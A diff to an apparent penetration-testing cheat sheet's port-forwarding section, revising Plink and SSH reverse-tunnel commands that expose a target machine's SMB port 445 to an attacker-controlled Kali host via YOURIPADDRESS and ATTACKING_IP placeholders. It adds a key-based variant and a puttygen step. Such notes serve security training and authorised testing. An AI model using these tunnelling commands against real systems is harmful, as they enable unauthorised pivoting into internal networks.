@@ -112,7 +112,12 @@ ____
  Expose internal services, usually hidden due to firewall rules. 
  ## Plink
      [upload plink.exe]
-     plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+     plink.exe -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS                  <-note entering in your password on a remote box is a bad idea
+     
+     -> better to generate ssh keys on kali, convert to putty keys and then upload  
+     sudo apt install putty-tools 
+     puttygen KEYFILE -o OUTPUT_KEY.ppk 
+     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
  ## SSH (Window 10 and newer)
      [from target box to expose SMB ]
      ssh -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
